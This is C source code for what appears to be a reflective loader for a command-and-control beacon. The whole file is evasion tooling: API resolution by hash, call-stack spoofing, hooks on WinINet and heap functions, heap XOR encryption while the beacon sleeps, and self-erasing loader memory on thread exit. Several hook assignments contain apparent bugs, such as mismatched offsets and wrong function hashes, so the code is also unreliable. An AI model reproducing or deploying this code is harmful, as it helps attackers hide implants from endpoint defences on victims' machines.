#include <Windows.h>

#include "api.h"
#include "hash.h"
#include "spoof.h"
#include "macro.h"
#include "ntdll.h"
#include "sleep.h"

typedef struct _USTRING
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING, * PUSTRING;

typedef BOOL(WINAPI* fnHeapWalk)	(HANDLE, LPPROCESS_HEAP_ENTRY);
typedef ULONG(NTAPI* fnRtlCaptureContext)   (PCONTEXT);
typedef void (WINAPI* fnExitThread)	(DWORD);
typedef void (NTAPI* fnNtContinue)	(PCONTEXT, BOOL);

#pragma code_seg(".text$e")
BOOL IsOdin(PBYTE content)
{
	if (content[0] == 0x4F &&
		content[1] == 0x64 &&
		content[2] == 0x69 &&
		content[3] == 0x6E &&
		content[4] == 0x4C &&
		content[5] == 0x64 &&
		content[6] == 0x72 &&
		content[7] == 0x31 &&
		content[8] == 0x33 &&
		content[9] == 0x33 &&
		content[10] == 0x37
		)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}


#pragma code_seg(".text$e")
PODIN GetOdinStruct(ULONG_PTR imageBase)
{

	while (TRUE)
	{
		if (IsOdin((PBYTE)imageBase))
		{
			return (PODIN)(imageBase + PATTERN_SIZE);
		}
		else
		{
			imageBase--;
		}

	}
}

#pragma code_seg(".text$e")
VOID xor_me(PBYTE pData, DWORD dwSize, BYTE key)
{
	for (int i = 0; i < dwSize; i++)
	{
		pData[i] = pData[i] ^ key;
	}
}

 

#pragma code_seg(".text$e")
VOID EncryptHeap(fnHeapWalk HeapWalk, HANDLE hHeap, BYTE key)
{
	PROCESS_HEAP_ENTRY phEntry = { 0 };
	DWORD dwHeapSize = 0;

	while (
		HeapWalk(hHeap, &phEntry) != FALSE)
	{
		if ((phEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
			dwHeapSize += phEntry.cbData;
			xor_me((PBYTE)phEntry.lpData, phEntry.cbData, key);


		}
	}

}

#pragma code_seg(".text$e")
void ExitThread_Hook(DWORD dwExitCode)
{
	PODIN pOdin = GetOdinStruct((ULONG_PTR)_ReturnAddress());

	void* pK32 = xGetModuleAddr(KERNEL32_HASH);
	void* pNtdll = xGetModuleAddr(NTDLL_HASH);

	void* pHeapDestroy = xGetProcAddr(pK32, HEAPDESTROY_HASH);
	void* pNtFreeVirtualMemory = xGetProcAddr(pNtdll, NTFREEVIRTUALMEMORY_HASH);
	void* pRtlCaptureContext = xGetProcAddr(pNtdll, RTLCAPTURECONTEXT_HASH);
	void* pRtlExitUserThread = xGetProcAddr(pNtdll, RTLEXITUSERTHREAD_HASH);
	void* pNtContinue = xGetProcAddr(pNtdll, NTCONTINUE_HASH);

	SPOOF_1(pHeapDestroy, pOdin->hHeap);

	CONTEXT ctxDeleteLdr;
	ctxDeleteLdr.ContextFlags = CONTEXT_AMD64;

	SIZE_T ldrSizeClean = 0;
	PVOID ldrAddrClean = pOdin->pBeaconAddr;

	((fnRtlCaptureContext)pRtlCaptureContext)(&ctxDeleteLdr);

	ctxDeleteLdr.Rip = (DWORD64)pNtFreeVirtualMemory;
	ctxDeleteLdr.Rcx = (DWORD64)(HANDLE)-1;
	ctxDeleteLdr.Rdx = (DWORD64) & ldrAddrClean;
	ctxDeleteLdr.R8 = (DWORD64) & ldrSizeClean;
	ctxDeleteLdr.R9 = (DWORD64)MEM_RELEASE;

	*(DWORD64*)(ctxDeleteLdr.Rsp) = (DWORD64)pRtlExitUserThread;


	/*
	We set FlsData to NULL, because LdrShutdownThread call RtlpFlsDataCleanup to cleanup the fls data but this is located in wiped memory.
	When is ptr is NULL, LdrShutdownThread don't call RtlpFlsDataCleanup.

	IDA F5 like a goat on LdrShutdownThread :

	  v1 = NtCurrentTeb();
	  v2 = NtCurrentPeb();
	  FlsData = (struct _RTLP_FLS_DATA *)v1->FlsData;
	  if ( FlsData )
		RtlpFlsDataCleanup(a1, (struct _RTLP_FLS_DATA *)v1->FlsData, 1u);

	So if FlsData of current current Teb is null, RtlpFlsDataCleanup is not call

	*/

	PTEB pTeb = NtCurrentTeb();
	pTeb->FlsData = NULL;

	((fnNtContinue)pNtContinue)(&ctxDeleteLdr, FALSE);
	
}


#pragma code_seg(".text$e")
HANDLE GetProcesHeap_Hook()
{
	PODIN pOdin = GetOdinStruct((ULONG_PTR)_ReturnAddress());
	return pOdin->hHeap;
}

#pragma code_seg(".text$e")
PVOID RtlAllocateHeap_Hook(PVOID HeapHandle, ULONG Flags, SIZE_T Size)
{

	void* pModule = xGetModuleAddr(NTDLL_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, RTLALLOCATEHEAP_HASH);

	PODIN pOdin = GetOdinStruct((ULONG_PTR)_ReturnAddress());

	void* ret = SPOOF_3(pFunctionAddr, pOdin->hHeap, (void*)Flags, (void*)Size);
	return ret;
}

#pragma code_seg(".text$e")
PVOID HeapAlloc_Hook(PVOID HeapHandle, DWORD dwFlags, SIZE_T dwBytes)
{
	return RtlAllocateHeap_Hook(HeapHandle, (ULONG)dwFlags, (SIZE_T)dwBytes);
}

#pragma code_seg(".text$e")
HANDLE HeapCreate_Hook(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
{
	PODIN pOdin = GetOdinStruct((ULONG_PTR)_ReturnAddress());

	return pOdin->hHeap;
}

#pragma code_seg(".text$e")
LPVOID InternetOpenA_Hook(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETOPENA_HASH);

	void* ret = SPOOF_5(pFunctionAddr, (void*)lpszAgent, (void*)dwAccessType, (void*)lpszProxy, (void*)lpszProxyBypass, (void*)dwFlags);
	return ret;
}

#pragma code_seg(".text$e")
BOOL InternetCloseHandle_Hook(LPVOID hInternet)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETCLOSEHANDLE_HASH);

	BOOL ret = (BOOL)SPOOF_1(pFunctionAddr, hInternet);
	return ret;
}

#pragma code_seg(".text$e")
BOOL InternetReadFile_Hook(LPVOID hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETREADFILE_HASH);

	BOOL ret = (BOOL)SPOOF_4(pFunctionAddr, hFile, lpBuffer, (void*)dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
	return ret;
}

#pragma code_seg(".text$e")
LPVOID InternetConnectA_Hook(LPVOID hInternet, LPCSTR lpszServerName, WORD nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETCONNECTA_HASH);

	void* ret = SPOOF_8(pFunctionAddr, hInternet, (void*)lpszServerName, (void*)nServerPort, (void*)lpszUserName, (void*)lpszPassword, (void*)dwService, (void*)dwFlags, (void*)dwContext);

	return ret;
}

#pragma code_seg(".text$e")
BOOL InternetQueryDataAvailable_Hook(LPVOID hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETQUERYDATAAVAILABLE_HASH);

	BOOL ret = (BOOL)SPOOF_4(pFunctionAddr, hFile, lpdwNumberOfBytesAvailable, (void*)dwFlags, (void*)dwContext);
	return ret;
}

#pragma code_seg(".text$e")
BOOL InternetQueryOptionA_Hook(LPVOID hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETQUERYOPTIONA_HASH);

	BOOL ret = (BOOL)SPOOF_4(pFunctionAddr, hInternet, (void*)dwOption, lpBuffer, (void*)lpdwBufferLength);
	return ret;
}

#pragma code_seg(".text$e")
BOOL InternetSetOptionA_Hook(LPVOID hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETSETOPTIONA_HASH);

	BOOL ret = (BOOL)SPOOF_4(pFunctionAddr, hInternet, (void*)dwOption, lpBuffer, (void*)dwBufferLength);
	return ret;
}

#pragma code_seg(".text$e")
LPVOID InternetSetStatusCallback_Hook(LPVOID hInternet, LPVOID lpfnInternetCallback)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, INTERNETSETOPTIONA_HASH);

	void* ret = SPOOF_2(pFunctionAddr, hInternet, lpfnInternetCallback);
	return ret;

}

#pragma code_seg(".text$e")
LPVOID HttpOpenRequestA_Hook(LPVOID hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, HTTPOPENREQUESTA_HASH);

	void* ret = SPOOF_8(pFunctionAddr, hConnect, (void*)lpszVerb, (void*)lpszObjectName, (void*)lpszVersion, (void*)lpszReferrer, lplpszAcceptTypes, (void*)dwFlags, (void*)dwContext);
	return ret;

}

#pragma code_seg(".text$e")
BOOL HttpAddRequestHeadersA_Hook(LPVOID hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, HTTPADDREQUESTHEADERSA_HASH);

	BOOL ret = (BOOL)SPOOF_4(pFunctionAddr, hRequest, (void*)lpszHeaders, (void*)dwHeadersLength, (void*)dwModifiers);
	return ret;
}

#pragma code_seg(".text$e")
BOOL HttpSendRequestA_Hook(LPVOID hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, HTTPSENDREQUESTA_HASH);

	BOOL ret = (BOOL)SPOOF_5(pFunctionAddr, hRequest, (void*)lpszHeaders, (void*)dwHeadersLength, lpOptional, (void*)dwOptionalLength);
	return ret;
}

#pragma code_seg(".text$e")
BOOL HttpQueryInfoA_Hook(LPVOID hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, HTTPQUERYINFOA_HASH);

	BOOL ret = (BOOL)SPOOF_5(pFunctionAddr, hRequest, (void*)dwInfoLevel, lpBuffer, (void*)lpdwBufferLength, (void*)lpdwIndex);
	return ret;
}

#pragma code_seg(".text$e")
DWORD WaitForSingleObject_Hook(HANDLE hHandle, DWORD dwMilliseconds)
{
	void* pModule = xGetModuleAddr(WININET_HASH);
	void* pFunctionAddr = xGetProcAddr(pModule, HTTPQUERYINFOA_HASH);

	DWORD ret = (DWORD)SPOOF_2(pFunctionAddr, hHandle, (void*)dwMilliseconds);
	return ret;
}

#pragma code_seg(".text$e")
VOID Sleep_Hook(DWORD dwMs)
{

	void* pNtdll = xGetModuleAddr(NTDLL_HASH);

	PODIN pOdin = GetOdinStruct((ULONG_PTR)_ReturnAddress());
	void* pHeapWalk = xGetProcAddr(xGetModuleAddr(KERNEL32_HASH), HEAPWALK_HASH);

	ULONG uSeed = 0x1337;
	void* pRtlRandom = xGetProcAddr(pNtdll, RTLRANDOM_HASH);
	BYTE key = (BYTE)SPOOF_1(pRtlRandom, (void*)&uSeed) % 255;

	EncryptHeap((fnHeapWalk)pHeapWalk, pOdin->hHeap, key);
	Sleep_Kraken(pOdin->pBeaconAddr, pOdin->stSize, dwMs);
	EncryptHeap((fnHeapWalk)pHeapWalk, pOdin->hHeap, key);

	return;
}

#pragma code_seg(".text$e")
DWORD xGetFunctionOffset(UINT_PTR function, UINT_PTR uiLoaderAddr)
{
	return function - uiLoaderAddr;
}

#pragma code_seg(".text$e")
UINT_PTR xGetNewHookAddr(UINT_PTR uiBeaconAddr, UINT_PTR uiBeaconSize, DWORD dwOffset)
{
	return uiBeaconAddr + uiBeaconSize + dwOffset;
}

#pragma code_seg(".text$e")
VOID InitHook(PLOADER_INFO info, PHOOK_LIST hook, UINT_PTR uiBeaconAddr, UINT_PTR uiBeaconSize)
{
	DWORD dwFunctionOffset = 0;

	//sleep hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&Sleep_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->Sleep.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//internetqueryoptiona hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetQueryOptionA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetQueryOptionA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, uiBeaconAddr);

	//waitforsingleobject hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&WaitForSingleObject_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->WaitForSingleObject.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//interconnecta hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetConnectA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetConnectA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//internetopena hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetOpenA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetOpenA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//internetclosehandle_hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetCloseHandle_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetCloseHandle.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//InternetReadFile_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetReadFile_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetReadFile.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//InternetConnectA_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetReadFile_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetReadFile.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//InternetQueryDataAvailable_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetQueryDataAvailable_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetQueryDataAvailable.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//InternetSetOptionA_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetSetOptionA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetSetOptionA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//InternetSetStatusCallback_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&InternetSetStatusCallback_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->InternetSetStatusCallback.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//HttpOpenRequestA_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&HttpOpenRequestA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->HttpOpenRequestA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//HttpAddRequestHeadersA_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&HttpAddRequestHeadersA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->HttpAddRequestHeadersA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//HttpSendRequestA_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&HttpSendRequestA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->HttpSendRequestA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//HttpQueryInfoA_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&HttpQueryInfoA_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->HttpQueryInfoA.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//GetProcessHeaap_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&GetProcesHeap_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->GetProcessHeap.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//ExitThread_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&ExitThread_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->ExitThread.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//RtlAllocateHeap_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&RtlAllocateHeap_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->RtlAllocateHeap.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//HeapAlloc_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&HeapAlloc_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->HeapAlloc.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	//HeapCreate_Hook
	dwFunctionOffset = xGetFunctionOffset((UINT_PTR)&HeapCreate_Hook, (UINT_PTR)info->pLoaderAddr);
	hook->HeapCreate.pHook = (void*)xGetNewHookAddr(uiBeaconAddr, uiBeaconSize, dwFunctionOffset);

	return;
}

#pragma code_seg(".text$e")
void* ResolveHook(LPCSTR functionName, PHOOK_LIST hook)
{
	DWORD dwFunctionOffset = 0;
	switch (HashMeDjb2A((char*)functionName))
	{
	case INTERNETOPENA_HASH:
		return hook->InternetOpenA.pHook;
		break;

	case INTERNETSETOPTIONA_HASH:
		return hook->InternetSetOptionA.pHook;
		break;

	case INTERNETCLOSEHANDLE_HASH:
		return hook->InternetCloseHandle.pHook;
		break;

	case INTERNETREADFILE_HASH:
		return hook->InternetReadFile.pHook;
		break;

	case INTERNETCONNECTA_HASH:
		return hook->InternetConnectA.pHook;
		break;

	case INTERNETQUERYDATAAVAILABLE_HASH:
		return hook->InternetQueryDataAvailable.pHook;
		break;

	case INTERNETQUERYOPTIONA_HASH:
		return hook->InternetQueryOptionA.pHook;
		break;

	case INTERNETSETSTATUSCALLBACK_HASH:
		return hook->InternetSetStatusCallback.pHook;
		break;

	case HTTPOPENREQUESTA_HASH:
		return hook->HttpOpenRequestA.pHook;
		break;

	case HTTPADDREQUESTHEADERSA_HASH:
		return hook->HttpAddRequestHeadersA.pHook;
		break;

	case HTTPSENDREQUESTA_HASH:
		return hook->HttpSendRequestA.pHook;
		break;

	case HTTPQUERYINFOA_HASH:
		return hook->HttpQueryInfoA.pHook;
		break;

	case GETPROCESSHEAP_HASH:
		return hook->GetProcessHeap.pHook;

	case HEAPCREATE_HASH:
		return hook->HeapCreate.pHook;

	case SLEEP_HASH:
		return hook->Sleep.pHook;
		
	case HEAPALLOC_HASH:
		return hook->HeapAlloc.pHook;

	case RTLALLOCATEHEAP_HASH:
		return hook->RtlAllocateHeap.pHook;

	case EXITTHREAD_HASH:
		return hook->ExitThread.pHook;
		
	default:
		return NULL;
		break;
	}
}